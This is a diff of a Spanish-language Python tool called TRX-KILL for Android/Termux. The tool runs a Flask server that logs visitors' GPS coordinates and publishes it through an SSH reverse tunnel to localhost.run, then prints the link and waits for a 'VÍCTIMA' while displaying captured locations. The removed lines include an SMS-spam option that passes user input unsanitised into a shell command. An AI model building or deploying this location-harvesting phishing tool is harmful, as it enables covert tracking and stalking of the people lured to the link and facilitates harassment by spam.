@@ -1,7 +1,6 @@
 import os, sys, time, threading
 from flask import Flask, request
 
-# --- CONFIGURACIÓN ---
 STORAGE_PATH = "/sdcard/TRX-KILL-RESUL"
 LOG_FILE = f"{STORAGE_PATH}/result.txt"
 if not os.path.exists(STORAGE_PATH): os.makedirs(STORAGE_PATH)
@@ -27,33 +26,31 @@ def log():
         f.write(f"GPS: {request.args.get('lat')},{request.args.get('lon')}\n")
     return "OK"
 
-def print_banner():
-    os.system('clear')
-    print(f"{G}  -------->-TRX-KILL v1.4.5 -<-----------")
-    print(f"  -HERRAMIENTA OSINT Y SEGURIDAD MÓVIL.{W}\n")
-
 def main():
+    # 1. Limpiar puertos
     os.system("fuser -k 5000/tcp > /dev/null 2>&1")
-    # Inicia el servidor
+    # 2. Iniciar servidor
     threading.Thread(target=lambda: app.run(host='127.0.0.1', port=5000, debug=False), daemon=True).start()
     
     while True:
-        print_banner()
-        print("  [1] RASTREAR NÚMERO | [2] LINK-ZP (HTTPS) | [3] CREADOR")
-        print("  [4] VERSIONES       | [5] ANALIZAR LINK     | [6] ADM SISTEMA")
-        print("  [7] INFO            | [8] REPOSITORIO       | [9] PROCESOS")
-        print("  [10] SPAM-SMS       | [0] SALIR")
-        sel = input(f"\n{Y}TRX-ROOT > {W}")
+        os.system('clear')
+        print(f"{G}--- TRX-KILL V3 (MENÚ PRINCIPAL) ---{W}")
+        print("[1] RASTREAR | [2] LINK-ZP (AUTO) | [0] SALIR")
+        sel = input("\nTRX-ROOT > ")
 
         if sel == "2":
             os.system('clear')
-            print(f"{C}--- GENERANDO LINK HTTPS SEGURO ---{W}")
-            # Esto lanza el túnel de Cloudflare que genera el HTTPS automáticamente
-            print(f"{G}Copiando dirección pública...{W}")
-            os.system("cloudflared tunnel --url http://localhost:5000 &")
-            time.sleep(5) # Espera a que el túnel conecte
-            print(f"\n{Y}EL LINK HTTPS HA SIDO GENERADO (REVISA LA SALIDA ARRIBA){W}")
-            print(f"{G}ESPERANDO VÍCTIMA...{W}")
+            print(f"{C}--- GENERANDO LINK AUTOMÁTICO ---{W}")
+            # Lanzamos el túnel de forma invisible
+            os.system("ssh -o StrictHostKeyChecking=no -R 80:localhost:5000 ssh.localhost.run > /sdcard/link.txt 2>&1 &")
+            print(f"{G}Túnel iniciado. Esperando link...{W}")
+            time.sleep(5)
+            # Leemos el link generado por el comando
+            os.system("grep -o 'https://[a-z0-9.-]*' /sdcard/link.txt > /sdcard/link_final.txt")
+            
+            print(f"{Y}TU LINK ES:{W}")
+            os.system("cat /sdcard/link_final.txt")
+            print(f"\n{C}ESPERANDO VÍCTIMA... (Escribe '0' para volver){W}")
             
             while True:
                 time.sleep(2)
@@ -61,18 +58,8 @@ def main():
                     with open(LOG_FILE, 'r') as f:
                         lines = f.readlines()
                         if lines:
-                            os.system('clear')
-                            print(f"{G}¡DATOS RECIBIDOS!{W}\n{lines[-1].strip()}")
-        
-        elif sel == "1":
-            input("NÚMERO: "); print("BUSCANDO..."); input("ENTER...")
-        elif sel == "3": print("CREADOR: OSCAR"); time.sleep(1)
-        elif sel == "4": print("VERSIÓN: 1.4.5"); time.sleep(1)
-        elif sel == "10": 
-            num = input("NÚMERO: "); msg = input("MSG: ")
-            os.system(f"termux-sms-send -n {num} '{msg}'")
-        elif sel == "0": 
-            os.system("pkill cloudflared")
-            sys.exit()
+                            print(f"{G}CAPTURA:{W} {lines[-1].strip()}")
+                if input() == '0': break
+        elif sel == "0": sys.exit()
 
 if __name__ == "__main__": main()
